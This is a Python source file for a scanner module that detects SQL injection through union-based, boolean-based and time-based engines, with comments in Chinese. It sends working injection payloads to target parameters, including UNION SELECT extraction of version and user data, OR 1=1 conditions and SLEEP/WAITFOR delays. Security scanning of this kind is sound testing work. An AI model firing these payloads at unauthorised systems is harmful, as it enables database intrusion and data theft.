"""
生產級 SQL 注入檢測模組 - 實用可部署版本
包含完整的檢測邏輯、錯誤處理和日誌記錄

基於真實滲透測試經驗設計，支持多種數據庫和注入技術
遵循 aiva_common.schemas 和四大模組架構標準
"""

from __future__ import annotations

import asyncio
import re
import time
from typing import Any

import httpx

from aiva_common.enums import (
    Confidence,
    ModuleName,
    Severity,
    Topic,
    VulnerabilityType,
)
from aiva_common.schemas import (
    FindingEvidence,
    FindingPayload,
    FindingTarget,
    FunctionTaskPayload,
    FunctionTaskTarget,
    Vulnerability,
)
from aiva_common.utils import get_logger, new_id

from ..common.base_function_module import BaseFunctionModule, DetectionEngineProtocol
from ..common.detection_config import SQLiConfig
from ..common.unified_smart_detection_manager import UnifiedSmartDetectionManager

logger = get_logger(__name__)


class ProductionUnionSQLiEngine(DetectionEngineProtocol):
    """生產級聯合查詢型 SQL 注入檢測引擎"""

    def __init__(self, concurrency_limit: int = 10) -> None:
        self._request_semaphore = asyncio.Semaphore(concurrency_limit)

    def get_engine_name(self) -> str:
        return "Production Union-based SQLi Detection Engine"

    async def detect(
        self,
        task: FunctionTaskPayload,
        client: httpx.AsyncClient,
        smart_manager: UnifiedSmartDetectionManager,
    ) -> list[FindingPayload]:
        """檢測聯合查詢型 SQL 注入漏洞"""
        findings: list[FindingPayload] = []
        target = task.target

        logger.info(f"開始 Union SQLi 檢測: {target.url}")

        # 1. 檢測列數
        column_count = await self._detect_column_count(target, client)
        if not column_count:
            logger.debug("無法檢測到有效的列數")
            return findings

        logger.debug(f"檢測到列數: {column_count}")

        # 2. 生成針對性的 Union payloads
        union_payloads = self._generate_union_payloads(column_count)

        # 3. 獲取基準響應
        baseline_response = await self._get_baseline_response(target, client)
        if not baseline_response:
            return findings

        # 4. 執行檢測
        for payload in union_payloads:
            try:
                detection_result = await self._test_union_payload(
                    target, payload, client, baseline_response, task
                )
                if detection_result:
                    findings.append(detection_result)
                    logger.info(f"發現 Union SQLi 漏洞: {payload[:50]}...")
                    break  # 找到漏洞即停止

            except Exception as e:
                logger.debug(f"Union payload 測試失敗 ({payload[:30]}...): {e}")
                continue

        return findings

    async def _detect_column_count(
        self, target: FunctionTaskTarget, client: httpx.AsyncClient
    ) -> int | None:
        """使用 ORDER BY 技術檢測查詢的列數"""
        for col_num in range(1, 11):  # 檢測 1-10 列
            try:
                payload = f"' ORDER BY {col_num}--"
                response = await self._send_payload_request(target, payload, client)
                
                # 檢查是否出現錯誤，表示列數已超出
                if self._has_database_error(response.text):
                    return col_num - 1 if col_num > 1 else None
                    
            except Exception as e:
                logger.debug(f"列數檢測錯誤 (第{col_num}列): {e}")
                continue
                
        return 3  # 默認假設 3 列

    def _generate_union_payloads(self, column_count: int) -> list[str]:
        """根據列數生成有效的 Union payloads"""
        payloads = []
        
        # 構建信息提取列
        info_columns = []
        for i in range(column_count):
            if i == 0:
                info_columns.append("@@version")
            elif i == 1:
                info_columns.append("user()")
            elif i == 2:
                info_columns.append("database()")
            else:
                info_columns.append(f"'{i+1}'")
        
        columns_str = ",".join(info_columns)
        
        # 基本 Union payloads
        base_payloads = [
            f"' UNION SELECT {columns_str}--",
            f"' UNION ALL SELECT {columns_str}--",
            f"') UNION SELECT {columns_str}--",
            f"' UNION SELECT {columns_str}#",
            f"'/**/UNION/**/SELECT/**/{columns_str}--",
            f"' UNION SELECT {columns_str} FROM dual--",  # Oracle
        ]
        
        payloads.extend(base_payloads)
        
        # NULL 值測試
        null_columns = ",".join(["NULL"] * column_count)
        null_payloads = [
            f"' UNION SELECT {null_columns}--",
            f"' UNION ALL SELECT {null_columns}--"
        ]
        payloads.extend(null_payloads)
        
        # 數據庫特定 payloads
        db_specific = [
            f"' UNION SELECT {columns_str} FROM information_schema.tables LIMIT 1--",  # MySQL
            f"' UNION SELECT {columns_str} FROM pg_tables LIMIT 1--",  # PostgreSQL
            f"' UNION SELECT {columns_str} FROM user_tables WHERE ROWNUM=1--",  # Oracle
        ]
        payloads.extend(db_specific)
        
        return payloads

    async def _get_baseline_response(
        self, target: FunctionTaskTarget, client: httpx.AsyncClient
    ) -> httpx.Response | None:
        """獲取基準響應"""
        try:
            async with self._request_semaphore:
                if target.method.upper() == "GET":
                    return await client.get(str(target.url), timeout=10.0)
                return await client.post(str(target.url), timeout=10.0)
        except Exception as e:
            logger.error(f"無法獲取基準響應: {e}")
            return None

    async def _send_payload_request(
        self, target: FunctionTaskTarget, payload: str, client: httpx.AsyncClient
    ) -> httpx.Response:
        """發送包含 payload 的請求"""
        async with self._request_semaphore:
            if target.method.upper() == "GET":
                params = {target.parameter: payload}
                return await client.get(str(target.url), params=params, timeout=15.0)
            data = {target.parameter: payload}
            return await client.post(str(target.url), data=data, timeout=15.0)

    async def _test_union_payload(
        self,
        target: FunctionTaskTarget,
        payload: str,
        client: httpx.AsyncClient,
        baseline_response: httpx.Response,
        task: FunctionTaskPayload,
    ) -> FindingPayload | None:
        """測試單個 Union payload"""
        try:
            response = await self._send_payload_request(target, payload, client)
            
            # 分析響應
            analysis_result = self._analyze_union_response(
                response, baseline_response, payload
            )
            
            if analysis_result["is_vulnerable"]:
                return self._create_finding(
                    task, target, payload, response, analysis_result
                )
                
        except Exception as e:
            logger.debug(f"Union payload 測試錯誤 ({payload[:30]}...): {e}")
            
        return None

    def _analyze_union_response(
        self, response: httpx.Response, baseline: httpx.Response, payload: str
    ) -> dict[str, Any]:
        """分析 Union 響應的多個維度"""
        response_text = response.text
        baseline_text = baseline.text
        
        result = {
            "is_vulnerable": False,
            "confidence": Confidence.LOW,
            "evidence": [],
            "database_type": None
        }
        
        # 1. 數據庫版本信息檢測
        version_patterns = {
            "mysql": r"mysql.*?(\d+\.\d+\.\d+)",
            "postgresql": r"postgresql.*?(\d+\.\d+)",
            "oracle": r"oracle.*database.*?(\d+[cg])",
            "sqlite": r"sqlite.*?(\d+\.\d+)",
            "mssql": r"microsoft.*sql.*server.*?(\d+\.\d+)"
        }
        
        for db_type, pattern in version_patterns.items():
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                result["database_type"] = db_type
                result["evidence"].append(f"數據庫版本: {match.group(0)}")
                result["is_vulnerable"] = True
                result["confidence"] = Confidence.HIGH
                break
        
        # 2. 用戶信息檢測
        user_patterns = [
            r"root@localhost",
            r"postgres@\w+",
            r"sa@\w+",
            r"\w+@\w+\.\w+",
            r"current_user.*?[\w@.]+"
        ]
        
        for pattern in user_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                result["evidence"].append(f"數據庫用戶: {match.group(0)}")
                result["is_vulnerable"] = True
                result["confidence"] = max(result["confidence"], Confidence.MEDIUM)
                break
        
        # 3. 響應長度和結構變化
        length_diff = abs(len(response_text) - len(baseline_text))
        if length_diff > 50:  # 顯著差異
            result["evidence"].append(f"響應長度變化: {length_diff} 字符")
            if not result["is_vulnerable"]:
                result["is_vulnerable"] = True
                result["confidence"] = Confidence.LOW
        
        # 4. 錯誤信息檢測
        if self._has_database_error(response_text):
            result["evidence"].append("檢測到數據庫錯誤信息")
            result["is_vulnerable"] = True
            result["confidence"] = max(result["confidence"], Confidence.MEDIUM)
        
        # 5. 數字模式檢測 (Union 查詢的數字列)
        number_pattern = r'\b[1-9]\b.*?\b[1-9]\b.*?\b[1-9]\b'
        if re.search(number_pattern, response_text) and not re.search(number_pattern, baseline_text):
            result["evidence"].append("檢測到 Union 查詢的數字模式")
            result["is_vulnerable"] = True
            result["confidence"] = max(result["confidence"], Confidence.MEDIUM)
        
        return result

    def _has_database_error(self, response_text: str) -> bool:
        """檢測數據庫錯誤信息"""
        error_patterns = [
            r"sql.*error",
            r"mysql.*error",
            r"ora-\d+",
            r"postgresql.*error",
            r"sqlite.*error",
            r"syntax.*error.*near",
            r"column.*doesn.*exist",
            r"table.*doesn.*exist",
            r"unknown.*column",
            r"invalid.*query"
        ]
        
        response_lower = response_text.lower()
        return any(re.search(pattern, response_lower) for pattern in error_patterns)

    def _create_finding(
        self,
        task: FunctionTaskPayload,
        target: FunctionTaskTarget,
        payload: str,
        response: httpx.Response,
        analysis: dict[str, Any],
    ) -> FindingPayload:
        """創建檢測結果"""
        vulnerability = Vulnerability(
            name=VulnerabilityType.SQLI,
            severity=Severity.LOW,
            confidence=analysis["confidence"]
        )

        evidence_text = "; ".join(analysis["evidence"])
        evidence = FindingEvidence(
            payload=payload,
            response=f"檢測證據: {evidence_text}. 響應片段: {response.text[:200]}",
            response_time_delta=response.elapsed.total_seconds()
        )

        return FindingPayload(
            finding_id=new_id("finding"),
            task_id=task.task_id,
            scan_id=task.scan_id,
            status="detected",
            vulnerability=vulnerability,
            target=FindingTarget(
                url=str(target.url),
                parameter=target.parameter,
                method=target.method
            ),
            evidence=evidence
        )


class ProductionBooleanSQLiEngine(DetectionEngineProtocol):
    """生產級布林型 SQL 注入檢測引擎"""

    def __init__(self, concurrency_limit: int = 10) -> None:
        self._request_semaphore = asyncio.Semaphore(concurrency_limit)

    def get_engine_name(self) -> str:
        return "Production Boolean-based SQLi Detection Engine"

    async def detect(
        self,
        task: FunctionTaskPayload,
        client: httpx.AsyncClient,
        smart_manager: UnifiedSmartDetectionManager,
    ) -> list[FindingPayload]:
        """檢測布林型 SQL 注入漏洞"""
        findings: list[FindingPayload] = []
        target = task.target

        logger.info(f"開始 Boolean SQLi 檢測: {target.url}")

        # 生成布林測試 payload 對
        boolean_pairs = self._generate_boolean_payloads()

        for true_payload, false_payload in boolean_pairs:
            try:
                # 發送 TRUE 條件請求
                true_response = await self._send_payload_request(target, true_payload, client)
                await self._delay_between_requests()
                
                # 發送 FALSE 條件請求
                false_response = await self._send_payload_request(target, false_payload, client)
                
                # 分析響應差異
                if self._has_boolean_injection(true_response, false_response):
                    finding = self._create_boolean_finding(
                        task, target, true_payload, false_payload, 
                        true_response, false_response
                    )
                    findings.append(finding)
                    logger.info(f"發現 Boolean SQLi 漏洞: {true_payload[:50]}...")
                    break

            except Exception as e:
                logger.debug(f"Boolean SQLi 測試失敗 ({true_payload[:30]}...): {e}")
                continue

        return findings

    def _generate_boolean_payloads(self) -> list[tuple[str, str]]:
        """生成布林測試 payload 對 (TRUE, FALSE)"""
        return [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' OR '1'='1", "' OR '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("') AND ('1'='1", "') AND ('1'='2"),
            ("' AND (SELECT COUNT(*) FROM users)>0--", "' AND (SELECT COUNT(*) FROM users)<0--"),
            ("' AND ASCII(SUBSTRING((SELECT version()),1,1))>50--", 
             "' AND ASCII(SUBSTRING((SELECT version()),1,1))>200--"),
        ]

    async def _send_payload_request(
        self, target: FunctionTaskTarget, payload: str, client: httpx.AsyncClient
    ) -> httpx.Response:
        """發送包含 payload 的請求"""
        async with self._request_semaphore:
            if target.method.upper() == "GET":
                params = {target.parameter: payload}
                return await client.get(str(target.url), params=params, timeout=15.0)
            data = {target.parameter: payload}
            return await client.post(str(target.url), data=data, timeout=15.0)

    async def _delay_between_requests(self) -> None:
        """請求間延遲，避免被防護機制阻擋"""
        await asyncio.sleep(0.5)

    def _has_boolean_injection(
        self, true_response: httpx.Response, false_response: httpx.Response
    ) -> bool:
        """檢測布林注入的多個指標"""
        true_text = true_response.text
        false_text = false_response.text
        
        # 1. 響應長度差異
        length_diff = abs(len(true_text) - len(false_text))
        if length_diff > 10:  # 顯著長度差異
            return True
        
        # 2. HTTP 狀態碼差異
        if true_response.status_code != false_response.status_code:
            return True
        
        # 3. 響應時間差異
        time_diff = abs(
            true_response.elapsed.total_seconds() - 
            false_response.elapsed.total_seconds()
        )
        if time_diff > 1.0:  # 1秒以上差異
            return True
        
        # 4. 內容相似度分析
        similarity = self._calculate_text_similarity(true_text, false_text)
        if similarity < 0.8:  # 相似度低於80%
            return True
        
        # 5. 特定關鍵字檢測
        true_keywords = self._extract_keywords(true_text)
        false_keywords = self._extract_keywords(false_text)
        
        # 如果關鍵字集合差異較大
        keyword_diff = len(true_keywords.symmetric_difference(false_keywords))
        return keyword_diff > 5

    def _calculate_text_similarity(self, text1: str, text2: str) -> float:
        """計算兩個文本的相似度"""
        if not text1 or not text2:
            return 0.0
        
        # 簡單的字符級相似度計算
        set1 = set(text1.lower().split())
        set2 = set(text2.lower().split())
        
        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))
        
        return intersection / union if union > 0 else 0.0

    def _extract_keywords(self, text: str) -> set[str]:
        """提取文本中的關鍵字"""
        import re
        # 提取英文單詞
        words = re.findall(r'\b[a-zA-Z]{3,}\b', text.lower())
        return set(words)

    def _create_boolean_finding(
        self,
        task: FunctionTaskPayload,
        target: FunctionTaskTarget,
        true_payload: str,
        false_payload: str,
        true_response: httpx.Response,
        false_response: httpx.Response,
    ) -> FindingPayload:
        """創建布林注入檢測結果"""
        vulnerability = Vulnerability(
            name=VulnerabilityType.SQLI,
            severity=Severity.LOW,
            confidence=Confidence.MEDIUM
        )

        # 分析差異
        length_diff = abs(len(true_response.text) - len(false_response.text))
        time_diff = abs(
            true_response.elapsed.total_seconds() - 
            false_response.elapsed.total_seconds()
        )

        evidence = FindingEvidence(
            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
            response=f"響應差異 - 長度差: {length_diff}, 時間差: {time_diff:.2f}s, "
                    f"狀態碼: {true_response.status_code} vs {false_response.status_code}",
            response_time_delta=max(
                true_response.elapsed.total_seconds(),
                false_response.elapsed.total_seconds()
            )
        )

        return FindingPayload(
            finding_id=new_id("finding"),
            task_id=task.task_id,
            scan_id=task.scan_id,
            status="detected",
            vulnerability=vulnerability,
            target=FindingTarget(
                url=str(target.url),
                parameter=target.parameter,
                method=target.method
            ),
            evidence=evidence
        )


class ProductionTimeSQLiEngine(DetectionEngineProtocol):
    """生產級時間型 SQL 注入檢測引擎"""

    def __init__(self, concurrency_limit: int = 5) -> None:
        self._request_semaphore = asyncio.Semaphore(concurrency_limit)

    def get_engine_name(self) -> str:
        return "Production Time-based SQLi Detection Engine"

    async def detect(
        self,
        task: FunctionTaskPayload,
        client: httpx.AsyncClient,
        smart_manager: UnifiedSmartDetectionManager,
    ) -> list[FindingPayload]:
        """檢測時間型 SQL 注入漏洞"""
        findings: list[FindingPayload] = []
        target = task.target

        logger.info(f"開始 Time-based SQLi 檢測: {target.url}")

        # 測量基準響應時間
        baseline_time = await self._measure_baseline_time(target, client)
        if baseline_time is None:
            return findings

        logger.debug(f"基準響應時間: {baseline_time:.2f}s")

        # 生成時間延遲 payloads
        time_payloads = self._generate_time_payloads()

        for payload, expected_delay in time_payloads:
            try:
                # 測量 payload 響應時間
                payload_time = await self._measure_payload_time(target, payload, client)
                
                if payload_time is None:
                    continue

                # 檢測時間異常
                if self._has_time_anomaly(baseline_time, payload_time, expected_delay):
                    finding = self._create_time_finding(
                        task, target, payload, baseline_time, payload_time, expected_delay
                    )
                    findings.append(finding)
                    logger.info(f"發現 Time-based SQLi 漏洞: {payload[:50]}...")
                    break

            except Exception as e:
                logger.debug(f"Time-based SQLi 測試失敗 ({payload[:30]}...): {e}")
                continue

        return findings

    async def _measure_baseline_time(
        self, target: FunctionTaskTarget, client: httpx.AsyncClient
    ) -> float | None:
        """測量基準響應時間（多次測量取平均值）"""
        times = []

        for _ in range(3):  # 測量3次
            try:
                start_time = time.time()
                async with self._request_semaphore:
                    if target.method.upper() == "GET":
                        await client.get(str(target.url), timeout=20.0)
                    else:
                        await client.post(str(target.url), timeout=20.0)
                end_time = time.time()

                times.append(end_time - start_time)
                await asyncio.sleep(0.5)  # 間隔測量
                
            except Exception as e:
                logger.debug(f"基準時間測量失敗: {e}")
                continue
        
        return sum(times) / len(times) if times else None

    async def _measure_payload_time(
        self, target: FunctionTaskTarget, payload: str, client: httpx.AsyncClient
    ) -> float | None:
        """測量包含 payload 的請求響應時間"""
        try:
            start_time = time.time()

            async with self._request_semaphore:
                if target.method.upper() == "GET":
                    params = {target.parameter: payload}
                    await client.get(str(target.url), params=params, timeout=30.0)
                else:
                    data = {target.parameter: payload}
                    await client.post(str(target.url), data=data, timeout=30.0)

            end_time = time.time()
            return end_time - start_time
            
        except Exception as e:
            logger.debug(f"Payload 時間測量失敗: {e}")
            return None

    def _generate_time_payloads(self) -> list[tuple[str, float]]:
        """生成時間延遲 payloads (payload, expected_delay_seconds)"""
        return [
            ("'; WAITFOR DELAY '00:00:05'--", 5.0),  # SQL Server
            ("'; SELECT SLEEP(5)--", 5.0),  # MySQL
            ("'; SELECT pg_sleep(5)--", 5.0),  # PostgreSQL
            ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5)--", 5.0),  # MySQL advanced
            ("' UNION SELECT SLEEP(5),2,3--", 5.0),  # MySQL Union
            ("' OR (SELECT 1 FROM dual WHERE 1=1 AND (SELECT 1 FROM (SELECT COUNT(*) FROM dual WHERE 1=1 AND SLEEP(3))x))--", 3.0),  # MySQL conditional
            ("'; IF (1=1) WAITFOR DELAY '00:00:03'--", 3.0),  # SQL Server conditional
        ]

    def _has_time_anomaly(
        self, baseline_time: float, payload_time: float, expected_delay: float
    ) -> bool:
        """檢測時間異常"""
        actual_delay = payload_time - baseline_time
        
        # 檢查是否有預期的延遲（允許±1秒誤差）
        if actual_delay >= (expected_delay - 1.0):
            return True
        
        # 檢查是否有異常長的響應時間
        return payload_time > (baseline_time * 3) and payload_time > 2.0

    def _create_time_finding(
        self,
        task: FunctionTaskPayload,
        target: FunctionTaskTarget,
        payload: str,
        baseline_time: float,
        payload_time: float,
        expected_delay: float,
    ) -> FindingPayload:
        """創建時間注入檢測結果"""
        actual_delay = payload_time - baseline_time
        
        vulnerability = Vulnerability(
            name=VulnerabilityType.SQLI,
            severity=Severity.LOW,
            confidence=Confidence.HIGH if actual_delay >= (expected_delay * 0.8) else Confidence.MEDIUM
        )

        evidence = FindingEvidence(
            payload=payload,
            response=f"時間分析: 基準時間 {baseline_time:.2f}s, Payload時間 {payload_time:.2f}s, "
                    f"實際延遲 {actual_delay:.2f}s, 預期延遲 {expected_delay}s",
            response_time_delta=payload_time
        )

        return FindingPayload(
            finding_id=new_id("finding"),
            task_id=task.task_id,
            scan_id=task.scan_id,
            status="detected",
            vulnerability=vulnerability,
            target=FindingTarget(
                url=str(target.url),
                parameter=target.parameter,
                method=target.method
            ),
            evidence=evidence
        )


class ProductionSQLiModule(BaseFunctionModule):
    """生產級 SQL 注入檢測模組"""

    def __init__(self, config: SQLiConfig | None = None) -> None:
        detection_engines = [
            ProductionUnionSQLiEngine(),
            ProductionBooleanSQLiEngine(),
            ProductionTimeSQLiEngine(),
        ]

        super().__init__(ModuleName.FUNC_SQLI, config or SQLiConfig(), detection_engines)

    def get_module_name(self) -> str:
        return "Production SQL Injection Detection Module"

    def get_supported_vulnerability_types(self) -> list[VulnerabilityType]:
        return [VulnerabilityType.SQLI]

    def get_topic(self) -> Topic:
        return Topic.TASK_FUNCTION_SQLI

    def get_vulnerability_type(self) -> VulnerabilityType:
        return VulnerabilityType.SQLI


